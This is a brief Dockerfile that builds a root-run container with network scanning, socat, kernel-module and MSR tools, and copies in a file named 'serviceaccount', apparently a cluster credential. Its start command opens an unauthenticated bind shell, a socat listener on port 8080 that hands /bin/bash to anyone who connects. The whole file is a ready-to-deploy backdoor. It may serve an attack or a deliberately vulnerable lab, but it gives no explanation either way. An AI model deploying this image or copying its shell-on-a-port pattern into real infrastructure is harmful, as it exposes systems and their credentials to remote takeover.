FROM python:3.8-slim-buster

RUN apt-get update && apt-get install -y wget curl nmap sudo socat kmod msr-tools

USER root
ENV HOME /root

COPY serviceaccount serviceaccount

EXPOSE 8080
CMD ["socat", "-T600", "TCP-LISTEN:8080,reuseaddr,fork", "EXEC:'/bin/bash'"]

